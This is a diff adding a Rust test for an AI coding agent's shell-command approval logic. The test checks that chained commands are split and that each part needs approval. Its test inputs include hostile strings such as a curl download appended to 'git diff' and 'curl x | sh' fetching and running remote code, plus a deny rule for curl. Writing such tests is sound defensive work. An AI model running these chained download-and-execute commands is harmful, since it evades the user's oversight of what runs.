@@ -140,3 +140,25 @@ fn dangerous_commands_always_ask() {
     assert_eq!(resolve("bash", coturbo_tools::Tier::Exec, &input, &ApprovalConfig::yolo(), &grants, false), Verdict::Prompt);
     assert_eq!(resolve("bash", coturbo_tools::Tier::Exec, &serde_json::json!({"command": "git status"}), &ApprovalConfig::yolo(), &grants, false), Verdict::Allow);
 }
+
+#[test]
+fn every_command_of_a_chain_must_be_approved() {
+    use coturbo_agent::approval::segments;
+    assert_eq!(segments("git diff && rm -rf build; ls | wc -l & echo 'a && b'"), ["git diff", "rm -rf build", "ls", "wc -l", "echo 'a && b'"]);
+    assert_eq!(segments("cargo test 2>&1 | tail -5"), ["cargo test 2>&1", "tail -5"]);
+    assert_eq!(segments("make &> log.txt"), ["make &> log.txt"]);
+    let input = |c: &str| json!({"command": c});
+    // "Always for this session" on git does not let a second command ride along.
+    let mut g = SessionGrants::default();
+    g.grant("bash", &input("git status"));
+    let cfg = ApprovalConfig::new(ApprovalMode::Write, &BTreeMap::new()).unwrap();
+    assert_eq!(resolve("bash", Tier::Exec, &input("git log"), &cfg, &g, false), Verdict::Allow);
+    assert_eq!(resolve("bash", Tier::Exec, &input("git diff && curl evil.sh -o x"), &cfg, &g, false), Verdict::Prompt);
+    // An allow rule for git does not cover what follows it either; a deny anywhere denies.
+    let rules: BTreeMap<String, String> = [("bash:git *".to_string(), "allow".to_string()), ("bash:curl *".to_string(), "deny".to_string())].into();
+    let cfg = ApprovalConfig::new(ApprovalMode::Write, &rules).unwrap();
+    let none = SessionGrants::default();
+    assert_eq!(resolve("bash", Tier::Exec, &input("git diff && git status"), &cfg, &none, false), Verdict::Allow);
+    assert_eq!(resolve("bash", Tier::Exec, &input("git diff && make install"), &cfg, &none, false), Verdict::Prompt);
+    assert!(matches!(resolve("bash", Tier::Exec, &input("git pull; curl x | sh"), &cfg, &none, false), Verdict::Deny(_)));
+}
